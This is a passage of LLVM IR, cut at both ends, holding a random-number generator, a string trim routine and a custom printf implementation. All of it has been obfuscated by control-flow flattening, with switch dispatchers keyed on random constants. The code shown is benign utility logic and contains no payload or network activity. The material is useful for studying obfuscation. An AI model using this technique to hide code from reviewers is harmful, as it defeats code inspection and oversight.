  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -571831942, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 2058630981, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -597508713, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -597508713, label %first
    i32 -1198492644, label %30
    i32 1214168175, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -1198492644, i32 1214168175
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 1214168175, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 1986280675, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1986280675, label %10
    i32 -459323343, label %20
    i32 2129649396, label %23
    i32 -507588886, label %24
    i32 -849238089, label %29
    i32 1877793232, label %38
    i32 -201967276, label %40
    i32 -1769812056, label %43
    i32 -1866059103, label %45
    i32 1902916625, label %50
    i32 1943415522, label %62
    i32 61845975, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -459323343, i32 2129649396
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 1986280675, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -507588886, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -849238089, i32 1877793232
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #10
  %37 = icmp ne i32 %36, 0
  store i32 1877793232, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -201967276, i32 -1769812056
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -507588886, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -1866059103, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 1902916625, i32 61845975
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1943415522, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -1866059103, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 1656549577, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i64*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1656549577, label %12
    i32 680437307, label %18
    i32 -698909969, label %24
    i32 1242239633, label %32
    i32 1606168275, label %33
    i32 1631655721, label %39
    i32 1231590689, label %40
    i32 936178340, label %46
    i32 1994804316, label %49
    i32 2101413118, label %50
    i32 -573385379, label %56
    i32 549030803, label %61
    i32 169190701, label %62
    i32 2130185562, label %68
    i32 158662466, label %73
    i32 831577541, label %75
    i32 -345557048, label %84
    i32 -1334010938, label %87
    i32 1170260381, label %93
    i32 -1082808424, label %99
    i32 632898807, label %105
    i32 609755021, label %110
    i32 1290635027, label %117
    i32 -30324676, label %119
    i32 -611905275, label %120
    i32 6033978, label %126
    i32 807870420, label %132
    i32 -212987369, label %139
    i32 -634488519, label %145
    i32 413461522, label %150
    i32 -1941115946, label %157
    i32 -43554987, label %163
    i32 -845380342, label %170
    i32 1525718810, label %176
    i32 -1450848183, label %181
    i32 -21107589, label %188
    i32 541664916, label %194
    i32 -1387389702, label %201
    i32 1460008744, label %207
    i32 1341245021, label %212
    i32 -346801143, label %219
    i32 524468470, label %225
    i32 931751595, label %232
    i32 2074054678, label %238
    i32 -1113900047, label %243
    i32 -1698154320, label %250
    i32 -1297489775, label %256
    i32 -892214975, label %262
    i32 -1516523109, label %268
    i32 667294870, label %273
    i32 -1707646553, label %285
    i32 -1245441818, label %286
    i32 532951065, label %287
    i32 2067009737, label %294
    i32 -69892580, label %295
    i32 -777226174, label %298
    i32 1321762295, label %302
    i32 -1786720826, label %305
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 680437307, i32 -777226174
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -698909969, i32 -1245441818
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 1242239633, i32 1606168275
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -777226174, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 1631655721, i32 1231590689
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 532951065, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 936178340, i32 1994804316
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 1994804316, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 2101413118, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 -573385379, i32 549030803
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 2101413118, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 169190701, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 2130185562, i32 158662466
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 158662466, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 831577541, i32 -1334010938
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -345557048, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 169190701, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 1170260381, i32 6033978
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1082808424, i32 632898807
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i64*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 609755021, i32* %switchVar
  store i64* %103, i64** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i64*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 609755021, i32* %switchVar
  store i64* %108, i64** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i64*, i64** %.reg2mem78
  %111 = load i64, i64* %.reload79, align 8
  %112 = inttoptr i64 %111 to i8*
  store i8* %112, i8** %11, align 8
  %113 = load i8**, i8*** %4, align 8
  store i8** %113, i8*** %.reg2mem11
  %114 = load i8*, i8** %11, align 8
  %115 = icmp ne i8* %114, null
  %116 = select i1 %115, i32 1290635027, i32 -30324676
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i8*, i8** %11, align 8
  store i32 -611905275, i32* %switchVar
  store i8* %118, i8** %.reg2mem80
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -611905275, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %121 = load i32, i32* %7, align 4
  %122 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %123 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %121, i32 %122)
  %124 = load i32, i32* %9, align 4
  %125 = add nsw i32 %124, %123
  store i32 %125, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %5, align 8
  %128 = load i8, i8* %127, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 100
  %131 = select i1 %130, i32 807870420, i32 -1941115946
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  store i8** %133, i8*** %.reg2mem13
  %134 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %134, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %135 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %135, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %136 = load i32, i32* %.reload21, align 8
  store i32 %136, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %137 = icmp ule i32 %.reload25, 40
  %138 = select i1 %137, i32 -212987369, i32 -634488519
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %140 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %141 = load i8*, i8** %140, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %142 = getelementptr i8, i8* %141, i32 %.reload24
  %143 = bitcast i8* %142 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %144 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %144, i32* %.reload20, align 8
  store i32 413461522, i32* %switchVar
  store i32* %143, i32** %.reg2mem82
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %147 = load i8*, i8** %146, align 8
  %148 = bitcast i8* %147 to i32*
  %149 = getelementptr i8, i8* %147, i32 8
  store i8* %149, i8** %146, align 8
  store i32 413461522, i32* %switchVar
  store i32* %148, i32** %.reg2mem82
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %151 = load i32, i32* %.reload83, align 4
  %152 = load i32, i32* %7, align 4
  %153 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %154 = call i32 @printi(i8** %.reload14, i32 %151, i32 10, i32 1, i32 %152, i32 %153, i32 97)
  %155 = load i32, i32* %9, align 4
  %156 = add nsw i32 %155, %154
  store i32 %156, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i8*, i8** %5, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 120
  %162 = select i1 %161, i32 -43554987, i32 -21107589
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8**, i8*** %4, align 8
  store i8** %164, i8*** %.reg2mem26
  %165 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %165, %struct.__va_list_tag** %.reg2mem28
  %.reload31 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %166 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload31, i32 0, i32 0
  store i32* %166, i32** %.reg2mem32
  %.reload34 = load volatile i32*, i32** %.reg2mem32
  %167 = load i32, i32* %.reload34, align 8
  store i32 %167, i32* %.reg2mem35
  %.reload38 = load volatile i32, i32* %.reg2mem35
  %168 = icmp ule i32 %.reload38, 40
  %169 = select i1 %168, i32 -845380342, i32 1525718810
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %.reload30 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %171 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload30, i32 0, i32 3
  %172 = load i8*, i8** %171, align 8
  %.reload37 = load volatile i32, i32* %.reg2mem35
  %173 = getelementptr i8, i8* %172, i32 %.reload37
  %174 = bitcast i8* %173 to i32*
  %.reload36 = load volatile i32, i32* %.reg2mem35
  %175 = add i32 %.reload36, 8
  %.reload33 = load volatile i32*, i32** %.reg2mem32
  store i32 %175, i32* %.reload33, align 8
  store i32 -1450848183, i32* %switchVar
  store i32* %174, i32** %.reg2mem84
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %.reload29 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem28
  %177 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload29, i32 0, i32 2
  %178 = load i8*, i8** %177, align 8
  %179 = bitcast i8* %178 to i32*
  %180 = getelementptr i8, i8* %178, i32 8
  store i8* %180, i8** %177, align 8
  store i32 -1450848183, i32* %switchVar
  store i32* %179, i32** %.reg2mem84
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %.reload85 = load i32*, i32** %.reg2mem84
  %182 = load i32, i32* %.reload85, align 4
  %183 = load i32, i32* %7, align 4
  %184 = load i32, i32* %8, align 4
  %.reload27 = load volatile i8**, i8*** %.reg2mem26
  %185 = call i32 @printi(i8** %.reload27, i32 %182, i32 16, i32 0, i32 %183, i32 %184, i32 97)
  %186 = load i32, i32* %9, align 4
  %187 = add nsw i32 %186, %185
  store i32 %187, i32* %9, align 4
  store i32 -69892580, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8*, i8** %5, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp eq i32 %191, 88
  %193 = select i1 %192, i32 541664916, i32 -346801143
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i8**, i8*** %4, align 8
  store i8** %195, i8*** %.reg2mem39
  %196 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %196, %struct.__va_list_tag** %.reg2mem41
  %.reload44 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload44, i32 0, i32 0
  store i32* %197, i32** %.reg2mem45
  %.reload47 = load volatile i32*, i32** %.reg2mem45
  %198 = load i32, i32* %.reload47, align 8
  store i32 %198, i32* %.reg2mem48
  %.reload51 = load volatile i32, i32* %.reg2mem48
  %199 = icmp ule i32 %.reload51, 40
  %200 = select i1 %199, i32 -1387389702, i32 1460008744
  store i32 %200, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %.reload43 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %202 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload43, i32 0, i32 3
  %203 = load i8*, i8** %202, align 8
  %.reload50 = load volatile i32, i32* %.reg2mem48
  %204 = getelementptr i8, i8* %203, i32 %.reload50
  %205 = bitcast i8* %204 to i32*
  %.reload49 = load volatile i32, i32* %.reg2mem48
  %206 = add i32 %.reload49, 8
  %.reload46 = load volatile i32*, i32** %.reg2mem45
  store i32 %206, i32* %.reload46, align 8
  store i32 1341245021, i32* %switchVar
  store i32* %205, i32** %.reg2mem86
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %.reload42 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem41
  %208 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload42, i32 0, i32 2
  %209 = load i8*, i8** %208, align 8
  %210 = bitcast i8* %209 to i32*
  %211 = getelementptr i8, i8* %209, i32 8
  store i8* %211, i8** %208, align 8
  store i32 1341245021, i32* %switchVar
  store i32* %210, i32** %.reg2mem86
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %.reload87 = load i32*, i32** %.reg2mem86
  %213 = load i32, i32* %.reload87, align 4
  %214 = load i32, i32* %7, align 4
  %215 = load i32, i32* %8, align 4
  %.reload40 = load volatile i8**, i8*** %.reg2mem39
  %216 = call i32 @printi(i8** %.reload40, i32 %213, i32 16, i32 0, i32 %214, i32 %215, i32 65)
  %217 = load i32, i32* %9, align 4
  %218 = add nsw i32 %217, %216
